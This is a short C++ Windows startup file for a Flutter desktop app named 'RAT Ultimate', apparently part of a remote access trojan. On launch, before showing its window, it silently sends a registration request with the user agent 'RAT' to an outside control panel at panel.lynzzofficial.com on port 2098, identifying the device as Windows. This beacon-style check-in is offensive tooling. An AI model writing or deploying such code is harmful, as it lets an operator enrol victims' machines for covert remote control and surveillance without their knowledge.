#include <windows.h>
#include <wininet.h>
#include "flutter_window.h"
#pragma comment(lib, "wininet.lib")
int APIENTRY wWinMain(HINSTANCE instance, HINSTANCE prev, PWSTR cmd_line, int cmd_show) {
  HINTERNET hSession = InternetOpen(L"RAT", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (hSession) {
    HINTERNET hConnect = InternetOpenUrl(hSession, L"http://panel.lynzzofficial.com:2098/register", L"device=windows", -1, INTERNET_FLAG_RELOAD, 0);
    if (hConnect) InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
  }
  FlutterWindow window(1280, 720, "RAT Ultimate");
  window.Show();
  return 0;
}